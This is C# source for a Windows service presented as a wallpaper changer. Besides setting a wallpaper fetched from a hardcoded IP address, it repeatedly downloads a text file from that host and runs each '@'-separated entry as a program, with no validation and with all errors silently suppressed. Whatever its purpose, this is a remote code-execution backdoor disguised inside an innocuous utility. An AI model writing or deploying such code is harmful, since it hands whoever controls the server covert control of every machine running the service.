using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Diagnostics;
using System.IO;
using System.Linq;
using System.Reflection;
using System.ServiceProcess;
using System.Text;
using System.Threading.Tasks;
using System.Timers;

namespace imgwpp
{
    public partial class WppChanger : ServiceBase
    {
        Timer _timer = null;
        string _lastProgStr = string.Empty;
        public WppChanger()
        {
            InitializeComponent();
        }

        [MTAThread()]
        public static void Main()
        {
            WppChanger svc = new WppChanger();
            svc.OnStart(null);
        }

        protected override void OnStart(string[] args)
        {
            Debug.Print("Info - Service Started");
            _timer = new Timer(SegToMili(20)); 
            _timer.Elapsed += new System.Timers.ElapsedEventHandler(timer_Elapsed);
            _timer.Start(); // <- important

            //Do the first time
            timer_Elapsed();

            while (true)
            {
                System.Threading.Thread.Sleep(MinToMili(60));
            }
        }

        private void timer_Elapsed()
        {
            timer_Elapsed(null, null);
        }
        private void timer_Elapsed(object sender, System.Timers.ElapsedEventArgs e)
        {
            try
            {
                //System.Diagnostics.Process.Start("mspaint.exe");


                //Uri imgPath = new Uri(System.IO.Path.GetDirectoryName(Assembly.GetExecutingAssembly().Location) + "/bgimage.png");
                Uri imgPath = new Uri("http://172.20.21.31" + "/bgimage.png");

                try
                {
                    Wallpaper.Set(imgPath, Wallpaper.Style.Centered);
                }
                catch (Exception)
                {
                    System.Reflection.Assembly thisExe;
                    thisExe = System.Reflection.Assembly.GetExecutingAssembly();
                    System.IO.Stream file =
                        thisExe.GetManifestResourceStream("imgwpp.windows10.jpg");

                    Wallpaper.Set(file, Wallpaper.Style.Stretched);
                }

                try
                {
                    Uri openprog = new Uri("http://172.20.21.31" + "/openprog.txt");
                    var a = new System.Net.WebClient().OpenRead(openprog.ToString());
                    bool runProgramsFlag = false;
                    using (var reader = new StreamReader(a, Encoding.UTF8))
                    {
                        var newString = reader.ReadToEnd();
                        if (_lastProgStr != newString)
                        {
                            _lastProgStr = newString;
                            runProgramsFlag = true;
                        }
                        // Do something with the value
                    }

                    if (runProgramsFlag)
                    {
                        var programs = _lastProgStr.Split('@');

                        foreach (var prog in programs)
                        {
                            System.Diagnostics.Process.Start(prog.Replace(System.Environment.NewLine, string.Empty).Trim().Replace("\r", "").Replace("\n", ""));
                            System.Threading.Thread.Sleep(SegToMili(3));
                        }
                    }

                }
                catch (Exception) { }

            }
            catch (Exception) { }


            _timer.Start(); // <- important
        }

        private int MinToMili(int min)
        {
            return min * SegToMili(60);
        }

        private int SegToMili(int seg)
        {
            return seg * 1000;
        }

        protected override void OnStop()
        {
        }
    }
}
